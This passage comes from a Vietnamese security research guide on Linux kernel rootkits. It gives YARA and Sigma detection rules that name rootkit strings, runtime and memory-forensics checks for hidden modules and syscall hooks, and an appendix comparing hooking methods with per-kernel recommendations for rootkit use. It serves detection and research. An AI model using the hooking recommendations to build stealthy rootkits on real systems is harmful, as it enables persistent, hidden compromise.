        description = "Detect LKM rootkit patterns"
        author = "research"
    
    strings:
        $s1 = "sys_call_table" ascii
        $s2 = "prepare_creds" ascii
        $s3 = "commit_creds" ascii
        $s4 = "list_del" ascii
        $s5 = "__x64_sys_getdents64" ascii
        $s6 = "kobject_del" ascii
        
        $magic1 = { DE AD 13 37 }
        $magic2 = "MAGIC_SIGNAL" ascii
        
        $hide1 = "hide_module" ascii
        $hide2 = "hidden_pid" ascii
        
    condition:
        uint32(0) == 0x464c457f and  // ELF magic
        (3 of ($s*)) and
        (1 of ($hide*) or 1 of ($magic*))
}
YARA

# Scan: yara rootkit_detector.yar /lib/modules/$(uname -r)/

# ── 2. Volatile Checks (runtime) ──

# Check syscall table integrity
# Mọi entry phải trỏ vào kernel text section [_stext, _etext]
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _stext"
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _etext"
# So sánh với: cat /proc/kallsyms | grep sys_call_table
# Dump entries và verify range

# Check hidden modules
# Method: so sánh /proc/modules với /sys/module/
diff <(cat /proc/modules | awk '{print $1}' | sort) \
     <(ls /sys/module/ | sort)
# Mismatch = hidden module hoặc built-in module

# Check ftrace hooks
cat /sys/kernel/debug/tracing/enabled_functions
cat /sys/kernel/debug/tracing/set_ftrace_filter
# Unexpected entries = potential rootkit

# Check kprobes
cat /sys/kernel/debug/kprobes/list
# Unexpected probes trên sys_* functions = suspicious

# Check eBPF programs  
bpftool prog list
bpftool map list
# Unexpected programs, đặc biệt kprobe/tracepoint type = suspicious

# ── 3. Memory Forensics (LiME + Volatility) ──

# Dump memory
sudo insmod lime.ko "path=/tmp/memdump.raw format=raw"

# Analyze với Volatility 3
vol3 -f /tmp/memdump.raw linux.lsmod.Lsmod
vol3 -f /tmp/memdump.raw linux.check_syscall.Check_syscall
vol3 -f /tmp/memdump.raw linux.hidden_modules.Hidden_modules
vol3 -f /tmp/memdump.raw linux.check_idt.Check_idt

# ── 4. Sigma Rule (cho SIEM) ──
cat > rootkit_detect.yml << 'SIGMA'
title: Suspicious Kernel Module Load
status: experimental
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - CommandLine|contains:
            - 'insmod'
            - 'modprobe'
        - EventType: 'module_load'
    filter:
        ModuleName|endswith:
            - '.ko'
        ModuleSigned: true
    condition: selection and not filter
level: high
SIGMA

# ── 5. LKRG (Linux Kernel Runtime Guard) ──
# Install và configure LKRG cho runtime integrity monitoring
# LKRG detect: syscall table modifications, credential changes,
# module hiding, và nhiều rootkit indicators khác.
# https://lkrg.org/
```

---

## Appendix: So sánh toàn bộ Hooking Methods

```
┌─────────────────┬───────────────┬──────────────┬──────────────┬─────────────┬──────────────┐
│ Feature         │ Syscall Table │ Ftrace       │ Kprobe       │ Inline Hook │ eBPF         │
├─────────────────┼───────────────┼──────────────┼──────────────┼─────────────┼──────────────┤
│ Kernel support  │ All versions  │ 3.x+         │ 2.6+         │ All         │ 4.x+         │
│ Need WP disable │ YES           │ No           │ No           │ YES         │ No           │
│ Hook target     │ Syscalls only │ Any function │ Any instruc. │ Any function│ Trace points │
│ API-based       │ No (manual)   │ Yes          │ Yes          │ No (manual) │ Yes          │
│ SMP safe        │ Manual        │ Automatic    │ Automatic    │ Manual      │ Automatic    │
│ Detection       │ Table check   │ debugfs      │ debugfs      │ Code CRC    │ bpftool      │
│ Stealth         │ Medium        │ Medium-High  │ Medium       │ High        │ Highest      │
│ Complexity      │ Low           │ Medium       │ Medium       │ High        │ High         │
│ Stability       │ Good          │ Good         │ Good         │ Risky       │ Sandboxed    │
│ Modern kernel   │ Harder        │ Easy         │ Easy         │ Hard        │ Native       │
│ CFI bypass      │ Needed        │ Not needed   │ Not needed   │ Needed      │ Not needed   │
│ APT usage       │ Common        │ Growing      │ Some         │ Rare        │ Emerging     │
│ Example rootkit │ Diamorphine   │ Kovid        │ Pinkit       │ Custom      │ TripleCross  │
└─────────────────┴───────────────┴──────────────┴──────────────┴─────────────┴──────────────┘

RECOMMENDATION BY KERNEL VERSION:
  Kernel < 4.17:  Syscall table hook (simple, well-documented)
  Kernel 4.17-5.6: Syscall table hoặc Ftrace
  Kernel 5.7+:    Ftrace (kallsyms unexport makes syscall table harder)
  Kernel 5.10+:   eBPF (mature enough for rootkit use)
  All versions:   Kprobe (good balance of features and compatibility)
```

---

*Tài liệu phục vụ nghiên cứu bảo mật. Thực hành trong VM được phép, trên hệ thống thật yêu cầu ủy quyền.*
